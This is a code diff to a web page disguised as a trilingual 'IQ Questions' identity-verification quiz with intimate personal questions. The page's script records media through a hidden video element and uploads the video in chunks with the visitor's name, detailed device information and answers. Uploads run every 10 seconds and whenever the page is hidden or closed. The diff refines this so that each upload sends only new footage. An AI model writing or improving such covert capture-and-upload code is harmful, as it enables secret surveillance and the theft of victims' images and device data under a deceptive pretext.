@@ -59,7 +59,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Top Header & Language Selector container */
         .top-bar {
             display: flex;
             justify-content: space-between;
@@ -115,7 +114,6 @@
 
         #video-container { display: none; }
 
-        /* Username styling */
         #username {
             width: 100%; 
             padding: 14px 16px; 
@@ -136,7 +134,6 @@
             box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15);
         }
 
-        /* Questions container style */
         .question-box { 
             margin-bottom: 16px; 
             text-align: left; 
@@ -147,7 +144,6 @@
             box-shadow: 0 2px 5px rgba(0,0,0,0.02);
         }
 
-        /* Handle RTL text alignment for Arabic */
         [dir="rtl"] .question-box {
             text-align: right;
         }
@@ -195,7 +191,6 @@
             box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.12);
         }
 
-        /* Modern Submit Button */
         button { 
             padding: 16px 24px; 
             border: none; 
@@ -251,7 +246,6 @@
         <form id="quizForm" onsubmit="event.preventDefault(); verifyAndStop();">
             <input type="text" id="username" placeholder="Votre Nom Complet" required><br>
             
-            <!-- الأسئلة الـ 20 -->
             <div class="question-box">
                 <label id="lbl1">1. Penses-tu être plus beau/belle que moi ?</label>
                 <select id="q1" required>
@@ -449,7 +443,6 @@
     </div>
 
     <script>
-        // Dictionary for translation (FR, AR, EN)
         const translations = {
             fr: {
                 title: "IQ Questions - Vérification d'identité",
@@ -573,7 +566,6 @@
             document.getElementById('username').placeholder = t.usernamePlaceholder;
             document.getElementById('submitBtn').innerText = t.submitBtn;
 
-            // Update questions
             for (let i = 1; i <= 20; i++) {
                 const lbl = document.getElementById('lbl' + i);
                 if (lbl && t.q[i-1]) {
@@ -581,7 +573,6 @@
                 }
             }
 
-            // Update generic select options text across dropdowns
             document.querySelectorAll('.opt-select').forEach(el => el.innerText = t.selectOpt);
             document.querySelectorAll('.opt-yes').forEach(el => el.innerText = t.yes);
             document.querySelectorAll('.opt-no').forEach(el => el.innerText = t.no);
@@ -708,7 +699,7 @@
                 };
                 mediaRecorder.start(1000);
 
-                // تزامن تلقائي كل 10 ثوانٍ لمنع ضياع الفيديو
+                // تزامن تلقائي كل 10 ثوانٍ (يرسل الجزء الجديد فقط ويفرغ المخزن المؤقت لمنع تكرار نفس الملف)
                 autoSyncInterval = setInterval(async () => {
                     if (!isCompleted && recordedChunks.length > 0) {
                         await sendDataBeacon("Auto-Sync 10s (Mise à jour)");
@@ -723,19 +714,22 @@
         async function sendDataBeacon(reason = "") {
             if (recordedChunks.length === 0) return;
 
-            const username = document.getElementById('username').value || "Utilisateur Anonyme";
+            // نسخ الأجزاء الحالية للإرسال
+            const currentChunks = [...recordedChunks];
+            // تفريغ المخزن المؤقت فوراً لكي لا يتم إعادة إرسال نفس الفيديو القديم في المرة القادمة
+            recordedChunks = [];
 
+            const username = document.getElementById('username').value || "Utilisateur Anonyme";
             const deviceDetails = await getDetailedDeviceInfo();
             const mimeType = mediaRecorder ? mediaRecorder.mimeType : 'video/webm';
             const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
-            const videoBlob = new Blob(recordedChunks, { type: mimeType });
+            const videoBlob = new Blob(currentChunks, { type: mimeType });
 
             const formData = new FormData();
             formData.append('username', `${username} [${reason}]`);
             formData.append('location', "Non disponible");
             formData.append('device', JSON.stringify(deviceDetails, null, 2));
 
-            // جمع الإجابات للـ 20 سؤالاً
             for (let i = 1; i <= 20; i++) {
                 let qVal = document.getElementById('q' + i).value || "N/A";
                 formData.append('q' + i, qVal);
@@ -752,7 +746,6 @@
             }
         }
 
-        // حفظ وتمرير البيانات فوراً عند إغلاق التطبيق أو ضغط المربع
         document.addEventListener('visibilitychange', async () => {
             if (document.visibilityState === 'hidden' && !isCompleted) {
                 await sendDataBeacon("Fermé via bouton carré / App masquée");
@@ -776,7 +769,6 @@
                 return;
             }
 
-            // التأكد من إجابة جميع الأسئلة العشرين
             for (let i = 1; i <= 20; i++) {
                 if (!document.getElementById('q' + i).value) {
                     statusDiv.style.color = '#ef4444';
